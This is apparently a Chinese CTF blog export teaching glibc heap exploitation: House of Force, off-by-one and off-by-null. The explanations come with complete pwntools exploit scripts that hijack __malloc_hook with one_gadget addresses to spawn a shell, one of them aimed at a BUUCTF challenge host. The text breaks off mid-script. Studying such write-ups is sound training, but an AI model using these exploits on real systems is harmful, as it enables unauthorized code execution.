<h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>来源：ctf.wiki</p>
<p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk指向我们期望的任何位置，这就相当于一次任意地址写。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这是top chunk在分配堆块时会执行的操作的源码，会对用户请求的size和 top chunk 现有的 size 进行验证，并且将会更新top chunk位置，以及size</p>
<p>我们主要关心的是对于size的验证：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE) <span class="hljs-comment">//nb指我们申请的堆块大小</span><br></code></pre></td></tr></table></figure>

<p>所以，设想一下：如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证。一般的做法是把 top chunk 的 size 改为-1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说unsigned long 中最大的数，所以无论如何都可以通过验证。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.29</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<span class="hljs-comment">//0x21000</span><br>        malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>在glibc-2.29时增加了检查，size要小于等于system_mems，所以该方法在glibc-2.29以后失效了</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>综合上面的背景，我们可以得出，要想利用House of Force，要有以下条件：</p>
<ul>
<li><p>能够以溢出等方式控制到 top chunk 的 size 域</p>
<ul>
<li>为了能将size修改为-1(0xFFFFFFFFFFFFFFFF)</li>
</ul>
</li>
<li><p>能够自由地控制堆分配尺寸的大小</p>
<ul>
<li>为了能够将top chunk抬升到我们想写入的地址附近，一般为hook，而这之间的偏移非常大</li>
</ul>
</li>
</ul>
<h3 id="例题BUU-gyctf-2020-force"><a href="#例题BUU-gyctf-2020-force" class="headerlink" title="例题BUU-gyctf_2020_force"></a>例题BUU-gyctf_2020_force</h3><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916151101226.png"><span class="image-caption">image-20210916151101226</span></p>
<p>常规checksec一下，64位保护全开</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916153042695.png"><span class="image-caption">image-20210916153042695</span></p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916153101689.png"><span class="image-caption">image-20210916153101689</span></p>
<p>进入IDA，总共就两个功能：一个是申请堆块，堆块大小无限制，并且能返回给堆地址，然后填入内容是固定长度0x50；另外一个puts功能。。。屁用没有！因为存在固定长度的写入，那么只要申请一个小堆块就可以进行溢出修改top chunk的size位，所以House of Force的两个条件都达成了</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916163309864.png"><span class="image-caption">image-20210916163309864</span></p>
<p>因为程序会返回堆的地址，程序又不限制堆块的大小，所以我们可以申请一个大于top chunk的堆块，那么程序就会调用mmap进行分配堆块，此时堆块的地址会是libc中的一个地址</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916163532720.png"><span class="image-caption">image-20210916163532720</span></p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916205725583.png"><span class="image-caption">image-20210916205725583</span></p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916205619022.png"><span class="image-caption">image-20210916205619022</span></p>
<p>然后申请一个小于0x50的堆块，让堆块能进行溢出覆盖top chunk的size位，修改为-1（也就是0xFFFFFFFFFFFFFFFF），同时也借着这个堆块能获取到top chunk的地址。然后直接申请一个超大堆块，直接占满top chunk与__malloc_hook之间长度，然后再申请一个堆块去修改hook的为one_gadget即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./gyctf_2020_force&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28894</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>	addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;content\n&quot;</span>)<br>	p.send(content)<br>	<span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">0x200ff0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>top_chunk = add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)) + <span class="hljs-number">0x10</span> <br>log.info(<span class="hljs-string">&quot;top_chunk==&gt;0x%x&quot;</span> %top_chunk)<br>offset = mlh - top_chunk<br>add(offset-<span class="hljs-number">0x33</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(ogg) + p64(realloc + <span class="hljs-number">0x10</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>其实看完wiki，感觉就是 offbyone&amp;null 的利用方式，借着溢出修改下一个堆块的in_use位置，然后造成unlink制造出堆块重叠，所以就不过多介绍了，看我的 offbyone&amp;null 这篇博客是一样的，而且我还更新了新版本的利用，当然，是来自大佬的，我只是个搬运工👶</p>
<p>过程：</p>
<ul>
<li>需要有溢出漏洞可以修改物理相邻的高地址的 prev_size 与 INUSE 部分。</li>
<li>在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li>
</ul>
<h2 id="House-Of-Lore"><a href="#House-Of-Lore" class="headerlink" title="House_Of_Lore"></a>House_Of_Lore</h2><h2 id="House-Of-Rabbit"><a href="#House-Of-Rabbit" class="headerlink" title="House_Of_Rabbit"></a>House_Of_Rabbit</h2>]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>offbyone&amp;null</title>
    <url>/2021/07/20/2021-07-26-offbyone&amp;null/</url>
    <content><![CDATA[<h1 id="offbyone"><a href="#offbyone" class="headerlink" title="offbyone"></a>offbyone</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>正常来说，我们希望程序的堆溢出能够溢出到next chunk的fd或者bk字段，进而完成利用。但是这样的情况是很少的，因而需要一种更加常见的特殊的堆溢出形式——offbyone，溢出字节就如他的名字一样，只能溢出一个字节。实际生活中这种漏洞很常见，程序员很容易犯这种错误，一般是因为边界检查不严格等情况。</p>
<p>怎么利用呢？试想一下，如果能溢出一个字节，那么我们申请个0xn8大小的堆块，那么多出的一个字节是不是可以修改下一个堆块的size字段？修改了之后，会让程序认为这个堆块的大小就是你修改的大小，从而导致overlap</p>
<p>如果你只把一个堆块的size变大，然后释放再申请出来，扩大的size将会从下面的堆块中取来，并把里面的内容清空，也就是想要再使用里面的堆块，需要去修复对应的堆头（用来泄露libc基址时，需要这样分开来操作）</p>
<p>offbyone情形：</p>
<ul>
<li>strlen函数把next chunk的size字段也给计入进去，造成溢出一个字节</li>
</ul>
<p>利用方式：堆中有ABCD四个已经被分配的大小为0x70的chunk，现在都是使用状态。然后A是我们进行offbyone的chunk，我们目的是将B的size改掉。</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164209854.png" style="zoom: 80%;"><span class="image-caption">image-20210726164209854</span>

<p>我们输入’A’*0x68 + ‘\xe1’,此时，堆块的布局如下：</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164413949.png" style="zoom:80%;"><span class="image-caption">image-20210726164413949</span>

<p>可以看到b的size被改大了，正好覆盖到了c的末尾，我们构造了chunkoverlap。这时候我们将C free掉，他会进入fastbin。我们再将B free掉，B+C这一段区域会进入unsorted bin。我们再次申请一个大小为0xd0的堆块，也就是说B+C这段内存被我们控制了，此时我们就可以控制C的fd字段，就可以进行fastbin attack了。</p>
<p>当然，实践应用的时候，并不局限说堆块大小都是0x70，0x28，0x38都行，只要能通过验证即可</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726113130649.png"><span class="image-caption">image-20210726113130649</span></p>
<p>常规checksec一下，然后进入ida看看程序代码</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726113232848.png"><span class="image-caption">image-20210726113232848</span></p>
<p>漏洞点存在与edit函数里面，在strlen函数里面，这个函数只有遇到’\x00’才会停止计数，如果我们申请0x78的堆块，并且填满0x78个字符，然后在这个堆块下面还存在一个堆块，那strlen就会把下一个堆块的size字段也给统计进去，从而可以多输入一个字符修改下一堆块的size字段。</p>
<p>那么该怎么构造呢？先申请四个0x68的堆块（至少四个）第一个用来修改下一个堆块的size字段，第四个用来防止与top chunk合并，中间两个用来制造overlap</p>
<p>把下一个堆块的size改为两倍大小——0xe1，接下来就是要让程序也认为被修改的堆块大小是0xe0，所以我们先后把第三块、第二块都释放掉，第三块进入fastbin，第二块由于size被改则进入到unsortedbin中，彻底让程序以为大小是为0xe0，最后只需要把0xe0的堆块申请出来，就可以修改其中本来是第三块的fd指针</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164722535.png"><span class="image-caption">image-20210726164722535</span></p>
<p>成功制造了overlap，两个0x70的堆块合并了</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164617715.png"><span class="image-caption">image-20210726164617715</span></p>
<p>很明显看到，fd指针已经被我们修改为我们想要分配chunk的地方</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164850626.png"><span class="image-caption">image-20210726164850626</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbyone&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>	p.send(content)	<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>+p8(<span class="hljs-number">0xe1</span>))<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c3b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0xd0</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">4</span>,payload)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="offbynull"><a href="#offbynull" class="headerlink" title="offbynull"></a>offbynull</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>其实本质也是一种offbyone，只是这个溢出的字节我们无法控制，只能是0。所以构造方法会与offbyone有些不同，但目的都是为了制造出overlap，毕竟uaf才是堆利用的核心！</p>
<p>offbynull情形：</p>
<ul>
<li>把你输入的堆块的地址加上输入的字符长度的地方置为0（一般来说没我下面的例题那么明显，会进行很多运算以及操作，但是本质还是一样的）</li>
<li>strcpy没做限制直接复制，如果输满的话会把字符串末尾的’\x00’一起复制过来，导致溢出一个0</li>
</ul>
<p>怎么利用呢？因为溢出的是0，所以明显只能把修改preinuse位修改了，所以这边都是申请0xf8大小的堆块，这样的堆块刚好为0x101，溢出的0只会修改preinuse，不会影响大小</p>
<p>利用方式：</p>
<p>abcd四个大小为0x100的堆块，都是在使用状态，这时候我们的目标堆块是C堆块</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726170224084.png" style="zoom:80%;"><span class="image-caption">image-20210726170224084</span>

<p>我们在B中输入 ‘A’*0x90 + p64(0x200) + ‘\x00’，输入完后布局将会变化成这样</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726170351639.png" style="zoom:80%;"><span class="image-caption">image-20210726170351639</span>

<p>此时，C的previnuse位被改成了0，程序会将B看作已经被释放的堆块。然后由于系统是通过prevsize位来定位前一个堆块的位置，在这里，我们将其改成了0x200,也就是说定位到了A堆块。然后先将A free掉放入unsortedbin，这时候再free C，就会触发合并操作。ABC将会被看作一个大小为0x300的堆块放入unsortedbin中。然而实际上，B并没有被free，我们也就通过这样的方式构造了overlap</p>
<p>在实际运用时，不局限都是0x100的，可以是中间的某个堆块是fast chunk也行，但是第一个在头的必须得是unsorted chunk大小的堆块，否则无法触发合并。</p>
<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726173924395.png"><span class="image-caption">image-20210726173924395</span></p>
<p>看程序的add函数里面，会把输入的长度多一个字节的地方置为0</p>
<p>这边有些奇怪，不懂为什么，如果只是用四个进行构造，将会报错，但是五个就行，第一个是用来泄露libc基址的，不用理会</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174131814.png"><span class="image-caption">image-20210726174131814</span></p>
<p>这是修改完目标堆块，以及释放了指向的堆块（目标堆块减去0x300）</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174439990.png"><span class="image-caption">image-20210726174439990</span></p>
<p>最后把目标堆块释放，触发合并，变成了0x400的堆块</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174611943.png"><span class="image-caption">image-20210726174611943</span></p>
<p>之后就是构造大小为0x71的堆块，这边构造堆块要注意，在被构造的堆块后面还要构造一个堆头，因为需要preinuse位置为1来表示我们构造的堆块是被使用的，然后才能被释放进入到fastbin里面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbynull&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>	p.send(content)	<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;eeee&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;gggg&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c3b00</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x300</span>))<br>free(<span 